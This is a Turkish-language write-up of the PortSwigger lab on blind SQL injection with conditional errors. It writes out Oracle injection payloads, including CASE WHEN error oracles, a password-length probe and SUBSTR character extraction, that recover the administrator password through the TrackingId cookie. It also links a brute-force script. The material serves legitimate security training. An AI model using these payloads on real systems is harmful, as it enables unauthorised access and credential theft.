


## Koşullu Hatalarla Kör SQL Enjeksiyonu (Blind SQLi with Conditional Errors)


Bu lab, **koşullu hatalara dayalı kör SQL enjeksiyonu** açığını içermektedir.
Uygulama:

-   `TrackingId` adlı bir çerezi analiz amacıyla kullanır.
    
-   Bu çerezin değerini içeren bir SQL sorgusu çalıştırır.
    
-   Sorgu sonucu ekrana basılmaz.
    
-   Eğer SQL sorgusu hata üretirse uygulama **500 Internal Server Error** döndürür.

Veritabanında:

-   `users` adlı tablo
    
-   `username` ve `password` sütunları bulunur.
    

Amaç:  
`administrator` kullanıcısının parolasını bulup giriş yapmaktır.


Lab açılışı şu şekilde:
![Blind SQLİ with conditional errors İLK](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/SQL%20Injection/images/Blind%20SQL%C4%B0%20with%20conditional%20errors%20%C4%B0LK.png?raw=true)

TrackingId çerezinin sonuna `'` işareti koyarak sayfayı gözlemliyoruz. Yükü uyguladıktan sonra sayfanın bir hata mesajı(Internet server error 500) verdiği görünüyor. Bu bize bir SQLi alabileceğini göstermekte.
![Blind SQLİ with conditional errors KONROL](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/SQL%20Injection/images/Blind%20SQL%C4%B0%20with%20conditional%20errors%20KONROL.png?raw=true)

Farklı veritabanları (MySQL, PostgreSQL, Oracle) farklı sözdizimleri kullanır. Oracle'da her `SELECT` sorgusunun bir `FROM` tablosuna ihtiyacı vardır (genellikle `DUAL` kullanılır).

-   Deneme 1: `' AND (SELECT 'A') = 'A` -> **HATA** (Oracle olmadığını düşündürür ama aslında tablo eksikliğinden hata veriyor olabilir).
    
-   Deneme 2: `' AND (SELECT 'A' FROM DUAL) = 'A` -> **200 OK** (Başarılı).
    

Bu sonuç, hedef veritabanının Oracle olduğunu kesinleştirir.
Deneme 1:
![Blind SQLİ with conditional errors KONROL2](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/SQL%20Injection/images/Blind%20SQL%C4%B0%20with%20conditional%20errors%20KONROL2.png?raw=true)
Deneme 2:
![Blind SQLİ with conditional errors KONROL3](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/SQL%20Injection/images/Blind%20SQL%C4%B0%20with%20conditional%20errors%20KONROL3.png?raw=true)


Veri sızdırmak için `CASE` ifadelerini ve kasıtlı hataları (sıfıra bölme gibi) kullanacağız. Mantık şudur: Eğer koşul doğruysa hata üret, yanlışsa normal devam et.
Sorgu örneği: `' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'A' END FROM DUAL) = 'A`

-   1=1 (Doğru): `1/0` çalışır -> 500 Error döner.
    
-   1=2 (Yanlış): `'A'` döner -> 200 OK döner.

`1=1` koşulunu içeren yükün uygulanmış hali:
![enter image description here](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/SQL%20Injection/images/Blind%20SQL%C4%B0%20with%20conditional%20errors%20CKONROL1.png?raw=true)

1=2 koşulunu içeren yükün uygulanmış hali:
![Blind SQLİ with conditional errors CKONROL2](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/SQL%20Injection/images/Blind%20SQL%C4%B0%20with%20conditional%20errors%20CKONROL2.png?raw=true)


Şimdi bu mantığı gerçek verileri sorgulamak için kullanalım.

Tablo Kontrolü:
`users` adında bir tablo var mı? `' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'A' END FROM users WHERE ROWNUM = 1) = 'A`
 Sonuç: 500 Error (Tablo mevcut).
![Blind SQLİ with conditional errors TKONTROL](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/SQL%20Injection/images/Blind%20SQL%C4%B0%20with%20conditional%20errors%20TKONTROL.png?raw=true)

Kullanıcı Kontrolü:
`administrator` kullanıcısı mevcut mu? `' AND (SELECT CASE WHEN (username = 'administrator') THEN TO_CHAR(1/0) ELSE 'A' END FROM users) = 'A`
Sonuç: 500 Error (Kullanıcı mevcut).
  ![Blind SQLİ with conditional errors UKONTROL1](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/SQL%20Injection/images/Blind%20SQL%C4%B0%20with%20conditional%20errors%20UKONTROL1.png?raw=true)

Parolayı bulmadan önce son bir bilgiye ihtiyacımız var bu da `administrator` kullanıcısının parola uzunluğu. `' AND (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username = 'administrator') > number) THEN TO_CHAR(1/0) ELSE 'A' END FROM DUAL) = 'A` yükündeki number kısmına değerler vererek parolanın uzunluğunu bulmaya çalışıyoruz.
örnek senaryo:
1. Sorgu `> 10` : Sayfa hata verdi demek ki parola 10 karakterden uzun.
2. Sorgu `> 19` : Sayfa hata verdi demek ki parola 19 karakterden uzun.
3. Sorgu `> 20` : Sayfa hata vermedi demek ki parola 20 karakter uzunluğunda.
4. Sorgu `= 20` : Son olarak konrol sorgusu. Sayfada hata yok parola 20 karakter uzunluğunda
![Blind SQLİ with conditional errors PLENGTH](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/SQL%20Injection/images/Blind%20SQL%C4%B0%20with%20conditional%20errors%20PLENGTH.png?raw=true)

Bu bilgileri kullanarak artık parolayı bulmaya hazırız. `' AND (SELECT  CASE WHEN ((SELECT SUBSTR(password,number,1) FROM users WHERE username = 'administrator')>'char' ) THEN TO_CHAR(1/0) ELSE 'A' END FROM DUAL) = 'A` yükteki `number` ve `char` kısımlarını değitirerek parolayı bulmaya çalışırız.
Yükün incelenmesi:
- `SELECT SUBSTR(password,number,1) FROM users...` : Veriyi cımbızla çeken kısımdır.
	- `SUBSTR(password, number, 1)` : `administrator` kullanıcısının şifresinden, belirtilen sıradaki (`number`) tek bir karakteri koparır. 
	- `> 'char'`: Koparılan o karakteri, saldırganın belirlediği bir karakterle (`'char'`) alfabetik olarak kıyaslar.

Örnek senaryo:
1. Sorgu(`numer` = 1, `char` = a): Sayfa hata verdi. İlk karakter 'a' dan büyük.
2. Sorgu(`numer` = 1, `char` = m): Sayfa hata vermedi. İlk karakter 'a' ve 'm' arasında.
3. Sorgu(`numer` = 1, `char` = h): Sayfa hata verdi. İlk karakter 'h' dan büyük.
4. Sorgu(`numer` = 1, `char` = i): Sayfa hata vermedi. İlk karakter 'i' olur.
5. Son konrol(`numer` = 1, `char` = i , `>` yerine `=`) : Sayfa hata verdi. İlk karakter 'i'

Bu şekilde tüm karakterler denenir. Bu çok uzun süreceğinden ben bir python kodu yazdım [link](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/Cods/BSQLi_CBF.py)'den sizde kullanabilirsiniz. Bu kod `' AND (SELECT  CASE WHEN ((SELECT SUBSTR(password,number,1) FROM users WHERE username = 'administrator')='char' ) THEN TO_CHAR(1/0) ELSE 'A' END FROM DUAL) = 'A` yükündeki number ve char ksımlarını değiştirir eğer sayfa 500 hata kodunu döndürürse number ve char kaydedilir en son ekrana basılı tüm karakterler ve yerleri bulunmuş olur.
![Blind SQLİ with conditional errors pbulma](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/SQL%20Injection/images/Blind%20SQL%C4%B0%20with%20conditional%20errors%20pbulma.png?raw=true)

Son olarak bulduğumuz parola ile giriş yapıyoruz ve lab çözülmüş oluyor.
![Blind SQLİ with conditional errors çözüm](https://github.com/HasanFiratKilic/Web-Hacking/blob/main/SQL%20Injection/images/Blind%20SQL%C4%B0%20with%20conditional%20errors%20%C3%A7%C3%B6z%C3%BCm.png?raw=true)

Linkden labı kendiniz çözebilirsiniz:</br>
https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

